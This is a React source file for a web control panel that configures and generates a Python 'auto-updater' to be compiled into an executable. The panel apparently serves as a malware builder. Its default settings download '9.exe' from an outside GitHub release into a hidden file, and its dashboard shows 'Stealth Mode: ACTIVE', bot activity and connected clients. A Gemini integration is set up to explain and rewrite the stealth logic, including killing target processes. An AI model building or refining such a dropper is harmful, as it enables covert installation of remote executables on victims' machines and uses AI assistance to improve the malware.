import React, { useState, useEffect, useRef } from 'react';
import Sidebar from './components/Sidebar';
import { VersionConfig, Tab, LogEntry } from './types';
import { generatePythonScript } from './utils/pythonTemplate';
import { 
  AlertCircle, CheckCircle2, Download, Terminal, RefreshCw, Copy, 
  ExternalLink, ShieldAlert, Sparkles, Bot, UploadCloud, File as FileIcon, 
  X, HardDrive, Cpu
} from 'lucide-react';
import { explainCode, customizeScript } from './services/geminiService';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState<Tab>(Tab.DASHBOARD);
  
  // State for the configuration
  const [config, setConfig] = useState<VersionConfig>({
    version: '2.0.0',
    downloadUrl: 'https://github.com/czhackx/czdownload/releases/download/aa/9.exe',
    executableName: '9.exe',
    hiddenFileName: 'version_info.dat',
    serverUrl: 'https://api.myapp.com/update_check',
    fileName: '9.exe',
    fileSize: '15.4 MB',
    uploadDate: new Date().toLocaleDateString()
  });

  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [generatedCode, setGeneratedCode] = useState<string>('');
  const [geminiAnalysis, setGeminiAnalysis] = useState<string>('');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [customPrompt, setCustomPrompt] = useState('');
  const [isCustomizing, setIsCustomizing] = useState(false);
  
  // Upload State
  const [isDragging, setIsDragging] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploadedFile, setUploadedFile] = useState<File | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setGeneratedCode(generatePythonScript(config));
  }, [config]);

  const addLog = (message: string, type: LogEntry['type'] = 'info') => {
    setLogs(prev => [{ timestamp: new Date().toLocaleTimeString(), message, type }, ...prev].slice(0, 50));
  };

  const handleUpdateConfig = (e: React.FormEvent) => {
    e.preventDefault();
    addLog(`Release configuration updated. Version set to ${config.version}`, 'success');
    setActiveTab(Tab.CLIENT_SCRIPT);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedCode);
    addLog('Python script copied to clipboard', 'success');
  };

  const handleGeminiAnalysis = async () => {
    setIsAnalyzing(true);
    addLog('Sending code to Gemini for analysis...', 'info');
    const result = await explainCode(generatedCode);
    setGeminiAnalysis(result);
    setIsAnalyzing(false);
    addLog('Analysis complete', 'success');
  };

  const handleCustomization = async () => {
      if(!customPrompt) return;
      setIsCustomizing(true);
      addLog(`Requesting code customization: "${customPrompt}"`, 'info');
      const newCode = await customizeScript(generatedCode, customPrompt);
      setGeneratedCode(newCode);
      setIsCustomizing(false);
      addLog('Code updated by AI', 'success');
  }

  // File Upload Handlers
  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  };
  
  const handleDragLeave = () => {
    setIsDragging(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
      processFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      processFile(e.target.files[0]);
    }
  };

  const processFile = (file: File) => {
    setUploadedFile(file);
    addLog(`Starting upload for: ${file.name}`, 'info');
    
    // Simulate upload progress
    let progress = 0;
    const interval = setInterval(() => {
      progress += 10;
      setUploadProgress(progress);
      if (progress >= 100) {
        clearInterval(interval);
        completeUpload(file);
      }
    }, 150);
  };

  const completeUpload = (file: File) => {
    // Generate a simulated secure URL
    const simulatedUrl = `https://cdn.myserver.com/releases/v${config.version}/${file.name}`;
    const fileSizeMB = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
    
    setConfig(prev => ({
      ...prev,
      downloadUrl: simulatedUrl,
      executableName: file.name,
      fileName: file.name,
      fileSize: fileSizeMB,
      uploadDate: new Date().toLocaleDateString()
    }));
    
    addLog(`File uploaded successfully. URL generated.`, 'success');
  };

  const clearFile = () => {
    setUploadedFile(null);
    setUploadProgress(0);
  };

  // Render Functions
  const renderDashboard = () => (
    <div className="space-y-6 animate-in fade-in duration-500">
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        {/* Card 1 */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <RefreshCw size={64} />
          </div>
          <h3 className="text-slate-400 text-sm font-medium mb-2">Current Live Version</h3>
          <div className="text-4xl font-mono font-bold text-white">{config.version}</div>
          <div className="mt-4 flex items-center gap-2 text-emerald-400 text-sm">
            <CheckCircle2 size={16} />
            <span>Deployment Active</span>
          </div>
        </div>

        {/* Card 2 */}
        <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 relative overflow-hidden group">
            <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <ShieldAlert size={64} />
            </div>
            <h3 className="text-slate-400 text-sm font-medium mb-2">Stealth Mode</h3>
            <div className="text-4xl font-mono font-bold text-white">ACTIVE</div>
            <div className="mt-4 flex items-center gap-2 text-amber-400 text-sm">
            <AlertCircle size={16} />
            <span>Hidden File: {config.hiddenFileName}</span>
            </div>
        </div>

         {/* Card 3 */}
         <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 relative overflow-hidden group">
            <div className="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
            <Terminal size={64} />
            </div>
            <h3 className="text-slate-400 text-sm font-medium mb-2">Bot Integration</h3>
            <div className="text-4xl font-mono font-bold text-white">READY</div>
            <div className="mt-4 flex items-center gap-2 text-blue-400 text-sm">
            <ExternalLink size={16} />
            <span>Endpoint Configured</span>
            </div>
        </div>
      </div>

      <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
        <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
            <Terminal size={20} className="text-slate-400"/>
            System Logs
        </h3>
        <div className="bg-slate-950 rounded-lg p-4 font-mono text-sm h-64 overflow-y-auto border border-slate-800">
            {logs.length === 0 && <span className="text-slate-600">Waiting for activity...</span>}
            {logs.map((log, idx) => (
                <div key={idx} className="mb-2 last:mb-0">
                    <span className="text-slate-500">[{log.timestamp}]</span>{' '}
                    <span className={`${
                        log.type === 'error' ? 'text-red-400' :
                        log.type === 'success' ? 'text-emerald-400' :
                        log.type === 'warning' ? 'text-amber-400' : 'text-blue-400'
                    }`}>
                        {log.message}
                    </span>
                </div>
            ))}
        </div>
      </div>
    </div>
  );

  const renderConfig = () => (
    <div className="max-w-4xl mx-auto animate-in slide-in-from-bottom-4 duration-500">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            {/* Left Column: Upload & Release */}
            <div className="lg:col-span-2 space-y-6">
                <div className="bg-slate-900 border border-slate-800 rounded-xl p-8">
                    <div className="flex items-center justify-between mb-6">
                         <h2 className="text-2xl font-bold text-white flex items-center gap-3">
                            <UploadCloud className="text-emerald-400" />
                            Release Manager
                         </h2>
                         {config.fileName && (
                             <span className="bg-slate-800 text-slate-300 text-xs px-2 py-1 rounded font-mono">
                                 LAST UPLOAD: {config.uploadDate}
                             </span>
                         )}
                    </div>

                    {/* File Upload Zone */}
                    <div 
                        className={`border-2 border-dashed rounded-xl p-8 text-center transition-all duration-300 ${
                            isDragging 
                                ? 'border-emerald-500 bg-emerald-500/10 scale-[1.02]' 
                                : 'border-slate-700 hover:border-slate-500 bg-slate-950/50'
                        }`}
                        onDragOver={handleDragOver}
                        onDragLeave={handleDragLeave}
                        onDrop={handleDrop}
                    >
                        {!uploadedFile ? (
                            <div className="flex flex-col items-center justify-center py-8">
                                <div className="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mb-4 text-slate-400">
                                    <FileIcon size={32} />
                                </div>
                                <h3 className="text-lg font-medium text-white mb-2">
                                    Drag and drop your executable here
                                </h3>
                                <p className="text-slate-400 text-sm mb-6 max-w-sm">
                                    Supports .exe, .zip, .msi files. Automatically generates version config and download links.
                                </p>
                                <input 
                                    type="file" 
                                    ref={fileInputRef}
                                    className="hidden" 
                                    onChange={handleFileSelect}
                                    accept=".exe,.zip,.msi"
                                />
                                <button 
                                    onClick={() => fileInputRef.current?.click()}
                                    className="px-6 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg transition-colors font-medium text-sm border border-slate-700"
                                >
                                    Browse Files
                                </button>
                            </div>
                        ) : (
                            <div className="flex items-center gap-4 bg-slate-800/50 p-4 rounded-lg text-left relative overflow-hidden">
                                <div className="w-12 h-12 bg-emerald-500/20 rounded flex items-center justify-center text-emerald-400 shrink-0">
                                    <FileIcon size={24} />
                                </div>
                                <div className="flex-1 min-w-0">
                                    <p className="text-white font-medium truncate">{uploadedFile.name}</p>
                                    <p className="text-slate-400 text-xs">{(uploadedFile.size / (1024 * 1024)).toFixed(2)} MB</p>
                                    
                                    {/* Progress Bar */}
                                    <div className="w-full h-1.5 bg-slate-700 rounded-full mt-2 overflow-hidden">
                                        <div 
                                            className="h-full bg-emerald-500 transition-all duration-300"
                                            style={{ width: `${uploadProgress}%` }}
                                        ></div>
                                    </div>
                                </div>
                                <button 
                                    onClick={clearFile}
                                    className="p-2 text-slate-500 hover:text-red-400 transition-colors"
                                >
                                    <X size={20} />
                                </button>
                            </div>
                        )}
                    </div>

                    {/* Manual Config Form */}
                    <form onSubmit={handleUpdateConfig} className="space-y-6 mt-8">
                         <div className="grid grid-cols-2 gap-4">
                            <div>
                                <label className="block text-sm font-medium text-slate-400 mb-2">Version Tag</label>
                                <input 
                                    type="text" 
                                    value={config.version}
                                    onChange={(e) => setConfig({...config, version: e.target.value})}
                                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors font-mono"
                                    placeholder="e.g. 2.0.0"
                                />
                            </div>
                            <div>
                                <label className="block text-sm font-medium text-slate-400 mb-2">Target Executable</label>
                                <input 
                                    type="text" 
                                    value={config.executableName}
                                    onChange={(e) => setConfig({...config, executableName: e.target.value})}
                                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors font-mono"
                                />
                            </div>
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-slate-400 mb-2">Hosting URL (Auto-Generated)</label>
                            <div className="flex gap-2">
                                <input 
                                    type="url" 
                                    value={config.downloadUrl}
                                    onChange={(e) => setConfig({...config, downloadUrl: e.target.value})}
                                    className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-emerald-400 focus:outline-none focus:border-emerald-500 transition-colors font-mono text-sm"
                                />
                                <button 
                                    type="button"
                                    className="bg-slate-800 px-4 rounded-lg text-slate-400 hover:text-white border border-slate-700"
                                    title="Regenerate Link"
                                >
                                    <RefreshCw size={18} />
                                </button>
                            </div>
                            <p className="text-xs text-slate-500 mt-2 flex items-center gap-1">
                                <CheckCircle2 size={12} className="text-emerald-500"/>
                                Verified download path
                            </p>
                        </div>
                        
                        <div className="pt-2">
                            <button 
                                type="submit"
                                className="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3 px-4 rounded-lg transition-colors flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/20"
                            >
                                <UploadCloud size={20} />
                                Publish New Release
                            </button>
                        </div>
                    </form>
                </div>
            </div>

            {/* Right Column: Server Status */}
            <div className="space-y-6">
                <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
                     <h3 className="text-sm font-bold text-slate-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                         <HardDrive size={16} />
                         Server Storage
                     </h3>
                     <div className="space-y-4">
                         <div className="bg-slate-950 rounded-lg p-4 border border-slate-800">
                             <div className="flex justify-between items-end mb-2">
                                 <span className="text-slate-400 text-sm">Capacity</span>
                                 <span className="text-white font-mono text-sm">45%</span>
                             </div>
                             <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
                                 <div className="h-full bg-blue-500 w-[45%]"></div>
                             </div>
                         </div>
                         
                         <div className="flex items-center justify-between text-sm py-2 border-b border-slate-800">
                             <span className="text-slate-500">Active Build</span>
                             <span className="text-emerald-400 font-mono">{config.fileName || 'None'}</span>
                         </div>
                         <div className="flex items-center justify-between text-sm py-2 border-b border-slate-800">
                             <span className="text-slate-500">Build Size</span>
                             <span className="text-slate-300 font-mono">{config.fileSize || '0 MB'}</span>
                         </div>
                         <div className="flex items-center justify-between text-sm py-2">
                             <span className="text-slate-500">Clients</span>
                             <span className="text-slate-300 font-mono">1,240 Connected</span>
                         </div>
                     </div>
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-xl p-6">
                     <h3 className="text-sm font-bold text-slate-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                         <Cpu size={16} />
                         Bot Activity
                     </h3>
                     <div className="space-y-3">
                         <div className="text-xs text-slate-500 font-mono p-2 bg-slate-950 rounded">
                             [10:42:05] Bot #01: Checked v{config.version}
                         </div>
                         <div className="text-xs text-slate-500 font-mono p-2 bg-slate-950 rounded">
                             [10:42:01] Bot #04: Update pending...
                         </div>
                         <div className="text-xs text-emerald-500/80 font-mono p-2 bg-emerald-500/5 rounded border border-emerald-500/10">
                             System ready for distribution.
                         </div>
                     </div>
                </div>
            </div>
        </div>
    </div>
  );

  const renderClientScript = () => (
    <div className="h-[calc(100vh-140px)] flex flex-col animate-in fade-in duration-500">
        <div className="flex justify-between items-center mb-4">
            <div>
                <h2 className="text-xl font-bold text-white">Python Auto-Updater</h2>
                <p className="text-sm text-slate-400">Generated client-side script. Compile to .exe using pyinstaller.</p>
            </div>
            <div className="flex gap-2">
                 <button 
                    onClick={() => setActiveTab(Tab.GEMINI_HELP)}
                    className="bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 border border-purple-500/30 px-4 py-2 rounded-lg text-sm font-medium transition-colors flex items-center gap-2"
                >
                    <Sparkles size={16} />
                    Customize with AI
                </button>
                <button 
                    onClick={copyToClipboard}
                    className="bg-slate-800 hover:bg-slate-700 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors flex items-center gap-2"
                >
                    <Copy size={16} />
                    Copy Code
                </button>
            </div>
        </div>
        <div className="flex-1 bg-slate-950 rounded-xl border border-slate-800 overflow-hidden flex flex-col">
             <div className="flex items-center gap-2 px-4 py-2 border-b border-slate-800 bg-slate-900/50">
                <div className="flex gap-1.5">
                    <div className="w-3 h-3 rounded-full bg-red-500/20 border border-red-500/50"></div>
                    <div className="w-3 h-3 rounded-full bg-amber-500/20 border border-amber-500/50"></div>
                    <div className="w-3 h-3 rounded-full bg-emerald-500/20 border border-emerald-500/50"></div>
                </div>
                <span className="ml-2 text-xs text-slate-500 font-mono">main.py</span>
             </div>
             <pre className="flex-1 p-4 overflow-auto text-sm text-slate-300 font-mono">
                {generatedCode}
             </pre>
        </div>
    </div>
  );

  const renderGeminiHelp = () => (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 h-[calc(100vh-140px)] animate-in fade-in duration-500">
        {/* Left Col: Analysis */}
        <div className="flex flex-col gap-6">
             <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 flex-1 flex flex-col">
                <h3 className="text-lg font-bold text-white mb-2 flex items-center gap-2">
                    <Bot className="text-purple-400" />
                    Code Analysis
                </h3>
                <p className="text-slate-400 text-sm mb-4">
                    Ask Gemini to explain how the stealth and update logic works in the current script.
                </p>
                
                <div className="flex-1 bg-slate-950 rounded-lg p-4 border border-slate-800 overflow-y-auto mb-4 text-sm text-slate-300 leading-relaxed">
                    {isAnalyzing ? (
                        <div className="flex items-center justify-center h-full text-purple-400 animate-pulse">
                            Analyzing code structure...
                        </div>
                    ) : geminiAnalysis ? (
                         <div className="prose prose-invert prose-sm max-w-none whitespace-pre-wrap">
                            {geminiAnalysis}
                         </div>
                    ) : (
                        <div className="flex items-center justify-center h-full text-slate-600">
                            No analysis generated yet.
                        </div>
                    )}
                </div>
                
                <button 
                    onClick={handleGeminiAnalysis}
                    disabled={isAnalyzing}
                    className="w-full bg-purple-600 hover:bg-purple-500 disabled:opacity-50 text-white font-bold py-3 px-4 rounded-lg transition-colors"
                >
                    {isAnalyzing ? 'Processing...' : 'Analyze Security & Logic'}
                </button>
             </div>
        </div>

        {/* Right Col: Customization */}
        <div className="flex flex-col gap-6">
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-6 flex-1 flex flex-col">
                <h3 className="text-lg font-bold text-white mb-2 flex items-center gap-2">
                    <Sparkles className="text-amber-400" />
                    Modify Script
                </h3>
                <p className="text-slate-400 text-sm mb-4">
                    Need to add logging? Change the hidden attribute method? Ask AI to rewrite the script.
                </p>
                
                <textarea 
                    value={customPrompt}
                    onChange={(e) => setCustomPrompt(e.target.value)}
                    placeholder="E.g., 'Add a function to kill the target process before updating' or 'Add logging to a text file'"
                    className="w-full h-32 bg-slate-950 border border-slate-800 rounded-lg p-4 text-white focus:outline-none focus:border-amber-500 transition-colors font-mono text-sm mb-4 resize-none"
                />

                <button 
                    onClick={handleCustomization}
                    disabled={isCustomizing || !customPrompt}
                    className="w-full bg-amber-600 hover:bg-amber-500 disabled:opacity-50 text-white font-bold py-3 px-4 rounded-lg transition-colors"
                >
                    {isCustomizing ? 'Generating Code...' : 'Apply Modifications'}
                </button>

                <div className="mt-6 p-4 bg-slate-950/50 rounded-lg border border-slate-800/50">
                    <h4 className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Tips</h4>
                    <ul className="text-xs text-slate-400 space-y-1 list-disc list-inside">
                        <li>Ask to "Add try/except blocks for network errors".</li>
                        <li>Request "Add a progress bar for the download".</li>
                        <li>Check the "Client Script" tab after applying.</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
  );

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      
      <main className="flex-1 flex flex-col overflow-hidden relative">
        {/* Header */}
        <header className="h-16 border-b border-slate-800 bg-slate-900/50 backdrop-blur-sm flex items-center justify-between px-8 sticky top-0 z-10">
            <div className="flex items-center gap-2">
                <span className="text-slate-500 font-mono text-sm">workspace /</span>
                <span className="text-white font-medium">
                    {activeTab === Tab.DASHBOARD && 'Overview'}
                    {activeTab === Tab.CONFIGURE && 'Release Manager'}
                    {activeTab === Tab.CLIENT_SCRIPT && 'Source Code'}
                    {activeTab === Tab.GEMINI_HELP && 'AI Assistant'}
                </span>
            </div>
            <div className="flex items-center gap-4">
                 {/* Connection Status Indicator */}
                 <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20">
                    <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
                    <span className="text-xs text-emerald-400 font-mono">API CONNECTED</span>
                 </div>
            </div>
        </header>

        {/* Content Area */}
        <div className="flex-1 overflow-auto p-8 relative">
           {/* Background Grid Pattern */}
           <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-5 pointer-events-none"></div>
           
           <div className="relative z-10">
                {activeTab === Tab.DASHBOARD && renderDashboard()}
                {activeTab === Tab.CONFIGURE && renderConfig()}
                {activeTab === Tab.CLIENT_SCRIPT && renderClientScript()}
                {activeTab === Tab.GEMINI_HELP && renderGeminiHelp()}
           </div>
        </div>
      </main>
    </div>
  );
};

export default App;